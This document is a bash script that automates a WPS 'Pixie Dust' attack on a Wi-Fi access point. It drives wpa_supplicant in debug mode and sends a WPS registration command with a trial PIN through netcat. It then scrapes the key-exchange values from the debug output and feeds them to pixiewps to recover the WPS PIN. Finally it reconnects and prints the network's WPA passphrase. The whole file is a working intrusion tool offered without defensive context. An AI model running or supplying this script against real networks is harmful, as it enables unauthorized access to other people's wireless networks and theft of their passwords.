#!/bin/bash

TEMPDIR=$(mktemp -d)
TEMPFILE=$(mktemp --suffix=.conf)
FIFO=$(mktemp -u --suffix=.pipe)
mkfifo $FIFO


BSSID=$1
PIN=$2
IFACE=$3
PIXIE=1
SOCKET=$TEMPDIR/$IFACE
echo $SOCKET
function quit() 
{
	rm -rf $TEMPDIR $TEMPFILE $FIFO
	exit
}

function resetPixie()
{
	PKE=''
	PKR=''
	EHASH1=''
	EHASH2=''
	AUTHKEY=''
	ENONCE=''
	PIXIE=0
}

function pixie()
{
	pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force
	if [ "$?" -eq 0 ]
	then
		PIN=$(pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force |\
			grep 'WPS pin' |\
			awk '{print $3}')
		PIXIE_STATUS=SUCCESS
	else
		PIXIE_STATUS=FAIL
	fi
	resetPixie
}

function attack()
{
	killall -9 wpa_supplicant
	printI "Launching wpa_supplicant"
	wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE > $FIFO &
	#Send WPS_REG command to wpa_supplicant socket
	printI "Sending WPS_REG command to wpa_supplicant"
	sleep 5 && sendCMD &

	#Launch wpa_supplicant & parse output
	while IFS= read -r LINE
	do
		#Parsing WPS messages
		if [[ $LINE =~ "WPS:" ]]
		then
			if [[ $LINE =~ "Building Message M" ]]
			then
				printI "Sending WPS Message $(echo "$LINE" | awk '{print $4}')"
			elif [[ $LINE =~ "Received M" ]]
			then
				printI "Received WPS Message $(echo "$LINE" | awk '{print $3}')"
			elif [[ $LINE =~ "Received WSC_NACK" ]]
			then
				printI 'Received WSC NACK'
				printE 'Error: wrong PIN code'
				break
			elif [[ $LINE =~ "Enrollee Nonce" ]]\
			  && [[ $LINE =~ "hexdump" ]]
			then
				ENONCE=$(gethex "$LINE")
				printG "E-Nonce: $ENONCE"
			elif [[ $LINE =~ "DH own Public Key" ]] 
			then
				PKR=$(gethex "$LINE")
				printG "PKR: $PKR"
			elif [[ $LINE =~ "DH peer Public Key" ]]\
			  && [[ $LINE =~ "hexdump" ]]
			then
				PKE=$(gethex "$LINE")
				printG "PKE: $PKE"
			elif [[ $LINE =~ "AuthKey" ]]
			then
				AUTHKEY=$(gethex "$LINE")
				printG "AuthKey: $AUTHKEY"
			elif [[ $LINE =~ "E-Hash1" ]]
			then
				EHASH1=$(gethex "$LINE")
				printG "E-Hash1: $EHASH1"
			elif [[ $LINE =~ "E-Hash2" ]]
			then
				EHASH2=$(gethex "$LINE")
				printG "E-Hash2: $EHASH2"
			elif [[ $LINE =~ "Network Key" ]]\
			  && [[ $LINE =~ "hexdump" ]]
			then
				WPA_KEY=$(gethex "$LINE" | xxd -r -p)
				printG "WPA pass: $WPA_KEY"
				quit
			fi

		#Status messages
		elif [[ $LINE =~ "State:" ]]
		then
			if [[ $LINE =~ "-> SCANNING" ]]
			then
				printI "Scanning…"
			fi
			
		elif [[ $LINE =~ "WPS-FAIL" ]]
		then
			printE "wpa_supplicant returned WPS-FAIL"
			break
		elif [[ $LINE =~ "Trying\ to\ authenticate\ with" ]]
		then
			printI "Authenticating..."
		elif [[ $LINE =~ "Authentication response" ]]
		then
			printG "Authenticated"
		elif [[ $LINE =~ "Trying to associate with" ]]
		then
			printI "Associating with AP..."
		elif [[ $LINE =~ "Associated with" ]] &&\
		     [ "$(echo "$LINE" | grep $IFACE)" ]
		then
			printG "Associated with $BSSID"
		elif [[ $LINE =~ "EAPOL: txStart" ]]
		then
			printI "Sending EAPOL Start..."
		elif [[ $LINE =~ "EAP entering state IDENTITY" ]]
		then
			printI "Received Identity Requset"
		elif [[ $LINE =~ "using real identity" ]]
		then
			printI "Sending Identity Response..."
		fi
	done < $FIFO
}

function sendCMD()
{
	echo -n "WPS_REG $BSSID $PIN" | nc -u -U "$SOCKET" 
	printI "Trying pin: $PIN"
}
function gethex()
{
	echo $1 | cut -d : -f 3 | sed --expression='s/ //g'
}
function printI()
{
	echo "[*] $@"
}
function printE()
{
	echo "[-] $@"
}
function printG()
{
	echo "[+] $@"
}

#Start here
#Write wpa_supplicant config to file
printI "Writing wpa_supplicant config"
echo -e "ctrl_interface=${TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n" > $TEMPFILE

attack

if [ "$PKE" ] && [ "$PKR" ] && [ "$EHASH1" ] && [ "$EHASH2" ] && [ "$ENONCE" ] && [ "$PIXIE" -eq 1 ]
then
	pixie
	if [ "$PIXIE_STATUS" = "SUCCESS" ]
	then
		printG "WPS pin: $(echo $PIN)"
		attack
	fi
else
	printE "Not enough data to run PixieDust"
fi

#Remove temp files and exit
quit
